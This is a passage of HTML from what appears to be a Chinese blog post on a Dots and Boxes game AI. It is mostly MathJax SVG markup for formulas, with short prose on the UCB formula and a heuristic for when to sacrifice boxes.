382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5706.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(6095.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6595.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(7040.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(7918.4,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(8447.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(9019.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(9408.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(10186.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10686.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mfrac" transform="translate(11131.1,0)"><g data-mml-node="mrow" transform="translate(220,747.9)"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(2403.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3014.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(4015,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5279.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5668.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(6418.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(3373.8,-686)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><rect width="7007.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(18378.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18767.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.75ex;" xmlns="http://www.w3.org/2000/svg" width="24.134ex" height="4.899ex" role="img" focusable="false" viewBox="0 -950 10667.3 2165.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1155.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2211.6,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(535,-1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g><g data-mml-node="mi" transform="translate(3822.2,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mo" transform="translate(4571.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4960.2,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5489.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6100.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="munder" transform="translate(7100.7,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(570.3,-1107.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g><g data-mml-node="mi" transform="translate(8711.3,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mo" transform="translate(9460.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(9849.3,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(10278.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>UCB计算公式：<br>$$<br>r_i=v_i+c<em>\sqrt{\frac{2</em>ln(\sum_{i}T_i)}{T_i}}<br>$$</p><h3 id="优化估值方法"><a href="#优化估值方法" class="headerlink" title="优化估值方法"></a>优化估值方法</h3><p>在游戏的中后期，会出现让格的情况，即牺牲一次围住格子的机会去换取后续更多的格子数。如何判断是否让格是个很大的问题，不妨这样想，</p><ul><li>环和长链越多，则空格多，说明我方应该优先填充仅剩的边线，让对手填充环和长链形成死树，可以让格。</li><li>当前空格少时，环和长链越少，此时应该由当前剩余格子数决定。</li></ul><p>我这里设置一个控制值<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.518ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1997 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(433,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(822,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1608,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.666ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3830.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(433,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(822,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1608,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2274.8,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="mn" transform="translate(3330.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 